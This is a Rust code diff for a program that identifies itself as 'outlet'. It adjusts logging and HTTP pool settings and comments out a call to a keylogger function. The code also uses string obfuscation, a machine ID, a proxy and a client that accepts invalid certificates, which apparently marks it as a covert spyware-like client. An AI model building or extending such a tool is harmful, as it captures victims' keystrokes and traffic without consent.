@@ -8,7 +8,7 @@ use std::{
 };
 
 use env_logger::Env;
-use log::info;
+use log::{LevelFilter, info};
 use mc_server_status::McClient;
 use muddy::muddy;
 use once_cell::sync::Lazy;
@@ -38,7 +38,11 @@ pub struct GlobalState {
 
 #[tokio::main]
 async fn main() {
-    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();
+    env_logger::Builder::new()
+        .filter_level(LevelFilter::Info)
+        .filter_module("trust_dns_proto", LevelFilter::Error)
+        .filter_module("trust_dns_resolver", LevelFilter::Error)
+        .init();
     info!("outlet inited with machine id: {:?}", *MACHINE_ID);
 
     let global_state = Arc::new(GlobalState {
@@ -66,10 +70,10 @@ async fn main() {
         .default_headers(headers)
         .danger_accept_invalid_hostnames(true)
         .danger_accept_invalid_certs(true)
-        .pool_max_idle_per_host(0)
+        .pool_max_idle_per_host(8)
         .connect_timeout(Duration::from_secs(5))
         .timeout(Duration::from_secs(20))
-        .pool_idle_timeout(Duration::from_secs(0))
+        .pool_idle_timeout(Duration::from_secs(5))
         .build()
         .unwrap();
 
@@ -78,7 +82,7 @@ async fn main() {
         .with_max_parallel(32);
 
     uptime_pinger(reqwest_client.clone());
-    keylogger(reqwest_client.to_owned());
+    // keylogger(reqwest_client.to_owned());
     proxy(reqwest_client.to_owned(), mc_client, global_state);
 
     info!("successfully inited, running forever!");
